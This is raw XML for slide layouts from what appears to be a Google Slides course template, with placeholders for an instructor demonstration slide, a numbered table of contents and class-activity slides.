            <a:lvl9pPr lvl="8" algn="ctr">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78" name="Google Shape;178;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="919500"/>
            <a:ext cx="1828800" cy="18288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9" name="Google Shape;179;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="3073125"/>
            <a:ext cx="8520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Instructor</a:t>
            </a:r>
            <a:r>
              <a:rPr i="0" lang="en" sz="4000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> Demonstration</a:t>
            </a:r>
            <a:endParaRPr i="0" sz="2400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="180" name="Google Shape;180;p31"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3934596" y="1424818"/>
            <a:ext cx="1274808" cy="81816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D - Blank chapter title slide">
  <p:cSld name="CUSTOM_26_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="accent2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="181" name="Shape 181"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2628900"/>
            <a:ext cx="9144000" cy="8064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SzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">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blank)">
  <p:cSld name="CUSTOM_21_2_2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="183" name="Shape 183"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="184" name="Google Shape;184;p33"/>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85" name="Google Shape;185;p33"/>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6" name="Google Shape;186;p33"/>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87" name="Google Shape;187;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="30095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with bullets)">
  <p:cSld name="CUSTOM_21_2_3">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="188" name="Shape 188"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="189" name="Google Shape;189;p34"/>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90" name="Google Shape;190;p34"/>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1" name="Google Shape;191;p34"/>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92" name="Google Shape;192;p34"/>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
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p34"/>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34"/>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34"/>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34"/>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34"/>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34"/>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199" name="Google Shape;199;p34"/>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0" name="Google Shape;200;p34"/>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1" name="Google Shape;201;p34"/>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2" name="Google Shape;202;p34"/>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3" name="Google Shape;203;p34"/>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04" name="Google Shape;204;p34"/>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05" name="Google Shape;205;p34"/>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06" name="Google Shape;206;p34"/>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07" name="Google Shape;207;p34"/>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08" name="Google Shape;208;p34"/>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blank)">
  <p:cSld name="CUSTOM_21_2_2_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="209" name="Shape 209"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="210" name="Google Shape;210;p35"/>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1" name="Google Shape;211;p35"/>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2" name="Google Shape;212;p35"/>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13" name="Google Shape;213;p35"/>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14" name="Google Shape;214;p35"/>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with bullets)">
  <p:cSld name="CUSTOM_21_2_2_1_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="215" name="Shape 215"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p36"/>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7" name="Google Shape;217;p36"/>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8" name="Google Shape;218;p36"/>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19" name="Google Shape;219;p36"/>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36"/>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36"/>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36"/>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36"/>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36"/>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5" name="Google Shape;225;p36"/>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6" name="Google Shape;226;p36"/>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7" name="Google Shape;227;p36"/>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8" name="Google Shape;228;p36"/>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9" name="Google Shape;229;p36"/>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30" name="Google Shape;230;p36"/>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31" name="Google Shape;231;p36"/>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32" name="Google Shape;232;p36"/>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33" name="Google Shape;233;p36"/>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34" name="Google Shape;234;p36"/>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35" name="Google Shape;235;p36"/>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spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="236" name="Shape 236"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237;p3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37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572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01.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457197" y="206217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02.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457204" y="253925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03.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457197" y="298165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04.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="344330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05.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="243" name="Google Shape;243;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="45638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06.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4563800" y="206488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07.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;245;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4563800" y="2529587"/>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08.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4563800" y="298162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09.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4563800" y="344473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10.</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="248" name="Google Shape;248;p37"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="313425" y="301475"/>
            <a:ext cx="287550" cy="364650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p37"/>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50" name="Google Shape;250;p3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51" name="Google Shape;251;p37"/>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Table of Contents</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="2600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="160934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3" name="Google Shape;253;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="343556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4" name="Google Shape;254;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="206590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5" name="Google Shape;255;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2522456"/>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6" name="Google Shape;256;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="297900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7" name="Google Shape;257;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="16093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8" name="Google Shape;258;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="34355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9" name="Google Shape;259;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="9" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="20659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0" name="Google Shape;260;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="13" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="2522451"/>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1" name="Google Shape;261;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="29790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extLst>
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst>
        <p15:guide id="1" pos="572">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="2884">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" pos="3168">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="288">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CUSTOM_23">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="262" name="Shape 262"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Google Shape;263;p3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38"/>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65" name="Google Shape;265;p38"/>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66" name="Google Shape;266;p38"/>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67" name="Google Shape;267;p38"/>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68" name="Google Shape;268;p38"/>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algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="269" name="Google Shape;269;p38"/>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70" name="Google Shape;270;p38"/>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71" name="Google Shape;271;p38"/>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Class activity)">
  <p:cSld name="CUSTOM_23_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="272" name="Shape 272"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;p3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39"/>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Class </a:t>
            </a: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75" name="Google Shape;275;p39"/>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76" name="Google Shape;276;p39"/>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77" name="Google Shape;277;p39"/>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78" name="Google Shape;278;p39"/>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rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="279" name="Google Shape;279;p39"/>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80" name="Google Shape;280;p39"/>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81" name="Google Shape;281;p39"/>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s">
